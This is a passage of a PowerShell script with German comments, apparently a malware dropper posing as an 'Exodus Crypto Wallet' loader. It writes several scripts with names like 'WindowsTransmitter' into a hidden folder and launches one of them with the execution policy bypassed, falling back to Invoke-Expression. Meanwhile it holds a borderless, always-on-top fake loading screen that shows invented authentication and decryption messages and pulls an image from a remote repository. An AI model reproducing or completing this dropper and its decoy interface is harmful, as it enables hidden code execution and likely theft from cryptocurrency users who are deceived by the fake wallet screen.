    $sysFolder.Attributes = $sysFolder.Attributes -bor [System.IO.FileAttributes]::Hidden
    Write-Output "System-Ordner erstellt und versteckt: $targetFolder"
}
# WindowsCeasar.ps1 in den Ordner schreiben
[IO.File]::WriteAllText($ceasarScriptPath, $ceasarScriptContent, [System.Text.Encoding]::UTF8)
Write-Output "WindowsCeasar.ps1 in $ceasarScriptPath geschrieben."
# WindowsOperator.ps1 in den Ordner schreiben
[IO.File]::WriteAllText($operatorScriptPath, $operatorScriptContent, [System.Text.Encoding]::UTF8)
Write-Output "WindowsOperator.ps1 in $operatorScriptPath geschrieben."
# WindowsTransmitter.ps1 in den Ordner schreiben
[IO.File]::WriteAllText($transmitterScriptPath, $transmitterScriptContent, [System.Text.Encoding]::UTF8)
Write-Output "WindowsTransmitter.ps1 in $transmitterScriptPath geschrieben."
# System.ps1 in den Ordner schreiben
[IO.File]::WriteAllText($systemScriptPath, $systemScriptContent, [System.Text.Encoding]::UTF8)
Write-Output "System.ps1 in $systemScriptPath geschrieben."
# MicrosoftViewS.ps1 in den Ordner schreiben
[IO.File]::WriteAllText($microsoftViewSScriptPath, $microsoftViewSScriptContent, [System.Text.Encoding]::UTF8)
Write-Output "MicrosoftViewS.ps1 in $microsoftViewSScriptPath geschrieben."
# Alle Dateien sind jetzt geschrieben – WindowsOperator.ps1 ausführen (hidden, non-blocking)


# NEU: Operator EINMAL starten (wenn Flag nicht existiert) – mit Debugging

    # Debugging-Setup
    $logDir = "$env:USERPROFILE\Desktop\DebugLogs"
    if (-not (Test-Path $logDir)) { New-Item -ItemType Directory -Path $logDir -Force | Out-Null }
    $timestamp = Get-Date -Format 'yyyyMMdd_HHmmss'
    $outputLog = Join-Path $logDir "Operator_Output_${timestamp}.txt"
    $errorLog = Join-Path $logDir "Operator_Error_${timestamp}.txt"

    Write-Output "Debugging-Modus aktiviert. Starte sichtbar: $operatorScriptPath"
    Write-Output "Logs: $outputLog | $errorLog"
    Write-Output "Aktuelle PS-Version: $($PSVersionTable.PSVersion.Major).$($PSVersionTable.PSVersion.Minor)"
    Write-Output "Aktuelle ExecutionPolicy: $(Get-ExecutionPolicy)"

    # Hilfsfunktion für Logs
    function Write-DebugLog {
        param([string]$Message, [string]$Type = "INFO")
        $timestamped = "[$(Get-Date)] [$Type] $Message"
        Write-Output $timestamped
        Add-Content -Path $outputLog -Value $timestamped -ErrorAction SilentlyContinue
    }

    # Policy setzen
    Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process | Out-Null
    Write-DebugLog "Policy auf Bypass gesetzt (Scope: Process)."

    $started = $false
    try {
        Write-DebugLog "Versuche Start-Process (sichtbar + Bypass)..."

        # Reine PS-Args als Array (kein Mix)
        $psArgs = @(
            "-ExecutionPolicy", "Bypass",
            "-NoProfile",
            "-File", $operatorScriptPath  # Keine extra Quotes, da Array
        )

        # Start-Process mit expliziten Params (kein Splatting, keine "and")
        $process = Start-Process -FilePath "powershell.exe" `
                                -ArgumentList $psArgs `
                                -WindowStyle "Normal" `
                                -RedirectStandardOutput $outputLog `
                                -RedirectStandardError $errorLog `
                                -PassThru `
                                -Wait

        $exitCode = if ($process.ExitCode -ne $null) { $process.ExitCode } else { $LASTEXITCODE }
        Write-DebugLog "Prozess gestartet (PID: $($process.Id)). Abgeschlossen mit ExitCode: $exitCode"

        $started = $true
        if ($exitCode -ne 0) { throw "Operator endete mit Fehler (ExitCode: $exitCode)" }

    } catch {
        Write-DebugLog "Start-Fehler: $($_.Exception.Message)" "ERROR"
        Write-DebugLog "StackTrace: $($_.ScriptStackTrace)" "ERROR"
    }

    if (-not $started) {
        # Fallback: Vereinfachter Start (ohne Redirects, um Errors zu vermeiden)
        Write-DebugLog "Fallback: Starte via powershell.exe -Bypass (vereinfacht)..."
        try {
            $fallbackArgs = @(
                "-ExecutionPolicy", "Bypass",
                "-NoProfile",
                "-File", $operatorScriptPath
            )
            $fallbackProcess = Start-Process -FilePath "powershell.exe" `
                                            -ArgumentList $fallbackArgs `
                                            -WindowStyle "Normal" `
                                            -PassThru `
                                            -Wait

            $fallbackExitCode = if ($fallbackProcess.ExitCode -ne $null) { $fallbackProcess.ExitCode } else { $LASTEXITCODE }
            Write-DebugLog "Fallback-Prozess abgeschlossen (ExitCode: $fallbackExitCode)."
            $started = $true
        } catch {
            Write-DebugLog "Fallback-Fehler: $($_.Exception.Message)" "ERROR"
        }
    }

    if (-not $started) {
        # Ultimativer Fallback: Inline-Ausführung (alles sichtbar im Hauptfenster)
        Write-DebugLog "Ultimativer Fallback: Inline-Ausführung..."
        if (Test-Path $operatorScriptPath) {
            $scriptContent = Get-Content $operatorScriptPath -Raw
            Invoke-Expression $scriptContent
        } else {
            Write-DebugLog "Script-Datei nicht gefunden: $operatorScriptPath" "ERROR"
        }
    }

    # Logs anzeigen (am Ende)
    if (Test-Path $outputLog -and (Get-Content $outputLog | Measure-Object).Count -gt 1) {
        Write-DebugLog "=== OUTPUT LOG (letzte 20 Zeilen) ==="
        Get-Content $outputLog -Tail 20
    }
    if (Test-Path $errorLog -and (Get-Item $errorLog).Length -gt 0) {
        Write-DebugLog "=== ERROR LOG ==="
        Get-Content $errorLog
    }

    # Flag setzen nach Start
    #New-Item -Path $flagFilePath -ItemType File -Force | Out-Null
    Write-DebugLog "Operator-Start abgeschlossen. Flag gesetzt."



# ==================== HAUPTFENSTER ====================
$form = New-Object System.Windows.Forms.Form
$form.Text = "Exodus WALLET"
$form.StartPosition = "CenterScreen"
$form.Size = New-Object System.Drawing.Size(1200, 720)
$form.FormBorderStyle = "None"
$form.MaximizeBox = $false
$form.MinimizeBox = $false
$form.ControlBox  = $false
$form.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
$form.ForeColor = [System.Drawing.Color]::White
$form.Cursor = [System.Windows.Forms.Cursors]::WaitCursor
$form.TopMost = $true

# ==================== GRADIENT-HEADER: EXODUS (OBEN) ====================
$headerPanel = New-Object System.Windows.Forms.Panel
$headerPanel.Dock = "Top"
$headerPanel.Height = 90
$headerPanel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")

$headerPanel.Add_Paint({
    param($sender, $e)

    $g = $e.Graphics
    $g.SmoothingMode = [System.Drawing.Drawing2D.SmoothingMode]::AntiAlias

    $text = "EXODUS CRYPTO WALLET"
    $font = New-Object System.Drawing.Font(
        "Segoe UI",
        44,
        [System.Drawing.FontStyle]::Bold
    )

    $sizeF = $g.MeasureString($text, $font)
    $x = ($sender.ClientSize.Width  - $sizeF.Width)  / 2
    $y = ($sender.ClientSize.Height - $sizeF.Height) / 2

    $rect = New-Object System.Drawing.RectangleF($x, $y, $sizeF.Width, $sizeF.Height)

    $colorStart = [System.Drawing.ColorTranslator]::FromHtml("#00E5FF") # Neonblau
    $colorEnd   = [System.Drawing.ColorTranslator]::FromHtml("#7C3AED") # Violett

    $brush = New-Object System.Drawing.Drawing2D.LinearGradientBrush(
        $rect,
        $colorStart,
        $colorEnd,
        [System.Drawing.Drawing2D.LinearGradientMode]::Horizontal
    )

    $g.DrawString($text, $font, $brush, $rect.Location)

    $brush.Dispose()
    $font.Dispose()
})

$form.Controls.Add($headerPanel)

# ==================== GIF (OBEN, volle Breite, unter EXODUS) ====================
$gifUrl  = "https://raw.githubusercontent.com/KunisCode/23sdafuebvauejsdfbatzg23rS/main/loading.gif"
$gifPath = Join-Path $env:TEMP "exodus_loading.gif"

try { (New-Object System.Net.WebClient).DownloadFile($gifUrl, $gifPath) } catch {}

$pictureBox = New-Object System.Windows.Forms.PictureBox
$pictureBox.Dock = "Top"
$pictureBox.Height = 400
$pictureBox.SizeMode = "Zoom"
$pictureBox.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")

if (Test-Path $gifPath) {
    $pictureBox.Image = [System.Drawing.Image]::FromFile($gifPath)
}
$form.Controls.Add($pictureBox)

# ==================== HEADER: AUTHENTICATION (MITTE OBEN) ====================
$loadingLabel = New-Object System.Windows.Forms.Label
$loadingLabel.Font = New-Object System.Drawing.Font(
    "Segoe UI",
    30,
    [System.Drawing.FontStyle]::Bold
)
$loadingLabel.ForeColor = "White"
$loadingLabel.Dock = "Top"
$loadingLabel.Height = 80
$loadingLabel.TextAlign = "MiddleCenter"
$loadingLabel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
$form.Controls.Add($loadingLabel)

# ===================== MODERNE FORTSCHRITTSBALKEN UNTEN =====================

$progressBg = New-Object System.Windows.Forms.Panel
$progressBg.Dock = "Bottom"
$progressBg.Height = 14
$progressBg.BackColor = [System.Drawing.Color]::FromArgb(40, 40, 50)

$progressBar = New-Object System.Windows.Forms.Panel
$progressBar.Height = 14
$progressBar.Width = 0
$progressBar.BackColor = [System.Drawing.Color]::FromArgb(139,92,246)
$progressBg.Controls.Add($progressBar)

$progressBg2 = New-Object System.Windows.Forms.Panel
$progressBg2.Dock = "Bottom"
$progressBg2.Height = 6
$progressBg2.BackColor = [System.Drawing.Color]::FromArgb(30, 30, 40)

$progressBar2 = New-Object System.Windows.Forms.Panel
$progressBar2.Height = 6
$progressBar2.Width = 50
$progressBar2.BackColor = [System.Drawing.Color]::FromArgb(180,140,255)
$progressBg2.Controls.Add($progressBar2)

# ==================== STATUSLABEL UNTEN ÜBER DEN LADEBALKEN ====================
$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 14)
$statusLabel.ForeColor = "#CCCCCC"
$statusLabel.Dock = "Bottom"
$statusLabel.Height = 40
$statusLabel.TextAlign = "MiddleCenter"
$statusLabel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")

# Docking-Reihenfolge für unten: von unten nach oben
$form.Controls.Add($progressBg2)
$form.Controls.Add($progressBg)
$form.Controls.Add($statusLabel)

# ===================== TIMER SETUP =====================

$marqueePos = 0
$percent = 0

$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 50

$labelTimer = New-Object System.Windows.Forms.Timer
$labelTimer.Interval = 3000

# ===================== STATUS PHASEN =====================

$authPhaseDuration = 15000      # 15 Sekunden
$inAuthPhase = $true
$authStartTime = Get-Date

# Anfangstexte beim Start
$loadingLabel.Text = "Authenticating device..."
$statusLabel.Text  = "Performing background security checks..."

$statuses = @(
    "Loading wallet...",
    "Connecting to secure servers...",
    "Decrypting local data...",
    "Fetching asset metadata...",
    "Syncing blockchain nodes...",
    "Preparing secure environment...",
    "Loading portfolio assets...",
    "Almost there..."
)

$statusIndex = 0
$dotCount = 0

# ===================== Fortschritt / Balken Animation =====================

$timer.Add_Tick({
    try {
        if ($form.IsDisposed) { $timer.Stop(); return }

        # Wenn die Authentifizierungsphase vorbei ist → Wechsel der Texte & Animation aktivieren
        if ($inAuthPhase -and ((Get-Date) - $authStartTime).TotalMilliseconds -gt $authPhaseDuration) {
            $inAuthPhase = $false
            $loadingLabel.Text = "Loading wallet"
            $statusLabel.Text  = $statuses[0]
        }

        # Marquee immer animieren
        $marqueePos += 5
        if ($marqueePos -gt $progressBg2.Width) { $marqueePos = -50 }
        $progressBar2.Left = $marqueePos

        # In der Auth-Phase keine Prozentanzeige
        if ($inAuthPhase) { return }

        # Prozentbalken füllen
        if ($percent -lt 100) {
            $percent += 0.3
            $progressBar.Width = [int]($progressBg.Width * ($percent / 100.0))
        }

    } catch {
    }
})

# ===================== TEXT-ANIMATION =====================

$labelTimer.Add_Tick({
    try {
        if ($form.IsDisposed) { $labelTimer.Stop(); return }

        # Während Auth-Phase keine Punktanimation, kein Statuswechsel
        if ($inAuthPhase) { return }

        $dotCount = ($dotCount + 1) % 4
        $loadingLabel.Text = "Loading wallet" + ("." * $dotCount)

        $statusIndex = ($statusIndex + 1) % $statuses.Count
        $statusLabel.Text = $statuses[$statusIndex]

    } catch {
    }
})

# ===================== CLEANUP =====================
$form.Add_FormClosing({
    $timer.Stop()
    $labelTimer.Stop()
})

$timer.Start()
$labelTimer.Start()

$form.Add_Shown({ $form.Activate() })

$form.ShowDialog() | Out-Null
